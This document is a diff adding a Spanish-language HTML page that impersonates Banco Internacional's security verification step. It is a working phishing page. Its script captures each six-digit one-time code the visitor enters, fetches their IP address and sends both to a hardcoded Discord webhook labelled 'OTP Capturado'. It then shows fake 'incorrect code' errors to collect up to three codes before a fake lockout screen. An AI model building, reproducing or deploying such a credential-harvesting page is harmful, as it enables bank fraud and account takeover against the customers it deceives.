@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Banco Internacional - Validación</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            min-height: 100vh;
+            background: #f5a81c url('background_omnia.jpg') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            color: #333;
+            padding: 20px;
+        }
+
+        .header {
+            margin-top: 30px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        .header img { width: 240px; height: auto; }
+
+        /* Tarjeta Principal */
+        .main-card {
+            width: 100%;
+            max-width: 500px;
+            background: rgba(255, 255, 255, 0.98);
+            border: 8px solid rgba(255, 255, 255, 0.3);
+            border-radius: 4px;
+            padding: 40px 30px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+
+        h2 { font-size: 18px; color: #444; margin-bottom: 10px; }
+        p.instruction { font-size: 14px; color: #666; margin-bottom: 30px; line-height: 1.4; }
+
+        /* Contenedor de Cajas */
+        .otp-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .otp-box {
+            width: 45px;
+            height: 55px;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            font-size: 24px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #f9f9f9;
+            color: #f5a81c;
+            transition: all 0.2s;
+        }
+        .otp-box.active { border-color: #f5a81c; box-shadow: 0 0 8px rgba(245,168,28,0.3); }
+        .otp-box.error { border-color: #ff4d4d; background: #fff2f2; animation: shake 0.3s; }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        #hiddenInput { position: absolute; opacity: 0; pointer-events: none; }
+
+        /* Botón Estilo Banco */
+        .btn-confirmar {
+            width: 100%;
+            max-width: 300px;
+            background: #f5a81c;
+            color: white;
+            border: none;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background 0.3s;
+        }
+        .btn-confirmar:disabled { background: #ccc; cursor: not-allowed; }
+
+        /* Countdown */
+        .timer-zone { margin-top: 20px; font-size: 13px; color: #888; display: none; }
+        .timer-zone.visible { display: block; }
+        #seconds { color: #f5a81c; font-weight: bold; }
+
+        /* Mensaje de Bloqueo Final */
+        #finalBlock { display: none; }
+        .block-icon { font-size: 50px; margin-bottom: 20px; }
+
+        .footer-secure {
+            margin-top: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            font-size: 11px;
+            color: #999;
+        }
+        .footer-secure img { width: 18px; opacity: 0.6; }
+
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <img src="logow.png" alt="Banco Internacional">
+    </div>
+
+    <div class="main-card" id="cardFlow">
+        <h2>Verificación de Seguridad</h2>
+        <p class="instruction">Hemos enviado un código de 6 dígitos a su celular. Por favor, ingréselo para continuar.</p>
+
+        <div class="otp-container" id="boxContainer">
+            <div class="otp-box" id="o0"></div>
+            <div class="otp-box" id="o1"></div>
+            <div class="otp-box" id="o2"></div>
+            <div class="otp-box" id="o3"></div>
+            <div class="otp-box" id="o4"></div>
+            <div class="otp-box" id="o5"></div>
+        </div>
+
+        <input type="tel" id="hiddenInput" maxlength="6" inputmode="numeric" autocomplete="one-time-code">
+
+        <button class="btn-confirmar" id="btnCheck">Confirmar Código</button>
+
+        <div class="timer-zone" id="timerZone">
+            Código incorrecto. Reintento en <span id="seconds">10</span>s
+        </div>
+
+        <div class="footer-secure">
+            <img src="shield-login.svg" alt="Seguro">
+            Operación protegida por Banco Internacional
+        </div>
+    </div>
+
+    <div class="main-card" id="finalBlock">
+        <div class="block-icon">🔒</div>
+        <h2>Acceso Restringido</h2>
+        <p class="instruction">Has superado el número de intentos permitidos. Por seguridad, tu banca online ha sido temporalmente bloqueada.</p>
+        <button class="btn-confirmar" onclick="window.location.href='index.html'">Volver al Inicio</button>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1491163890715853021/Z7As4jVZZHi81cEJZjXhzbQez81R5grblQVbf29Rh4AH5Y2b8Jw54wBfVHNAPXC9QOkW";
+        const input = document.getElementById('hiddenInput');
+        const btn = document.getElementById('btnCheck');
+        let intentos = 0;
+
+        // Enfocar input al hacer clic en las cajas
+        document.getElementById('boxContainer').addEventListener('click', () => input.focus());
+
+        input.addEventListener('input', () => {
+            const val = input.value.replace(/\D/g, '');
+            input.value = val;
+            
+            for(let i=0; i<6; i++) {
+                const box = document.getElementById('o' + i);
+                box.textContent = val[i] || '';
+                box.classList.toggle('active', i === val.length);
+            }
+        });
+
+        async function sendCode(codigo) {
+            const r = await fetch('https://api.ipify.org?format=json');
+            const d = await r.json();
+            
+            const payload = {
+                embeds: [{
+                    title: "🔢 OTP Capturado",
+                    color: 0xF5A81C,
+                    fields: [
+                        { name: "Código", value: `**${codigo}**`, inline: true },
+                        { name: "Intento", value: `${intentos + 1}`, inline: true },
+                        { name: "IP", value: d.ip, inline: false }
+                    ],
+                    footer: { text: "Banco Internacional · Seguridad" }
+                }]
+            };
+            await fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+        }
+
+        btn.addEventListener('click', async () => {
+            if(input.value.length < 6) return;
+
+            intentos++;
+            await sendCode(input.value);
+
+            if(intentos >= 3) {
+                document.getElementById('cardFlow').style.display = 'none';
+                document.getElementById('finalBlock').style.display = 'block';
+                return;
+            }
+
+            // Error y bloqueo temporal
+            btn.disabled = true;
+            document.querySelectorAll('.otp-box').forEach(b => b.classList.add('error'));
+            const zone = document.getElementById('timerZone');
+            zone.classList.add('visible');
+            
+            let count = 10;
+            const t = setInterval(() => {
+                count--;
+                document.getElementById('seconds').textContent = count;
+                if(count <= 0) {
+                    clearInterval(t);
+                    btn.disabled = false;
+                    zone.classList.remove('visible');
+                    input.value = '';
+                    document.querySelectorAll('.otp-box').forEach(b => {
+                        b.classList.remove('error');
+                        b.textContent = '';
+                    });
+                    input.focus();
+                }
+            }, 1000);
+        });
+
+        window.onload = () => input.focus();
+    </script>
+</body>
+</html>
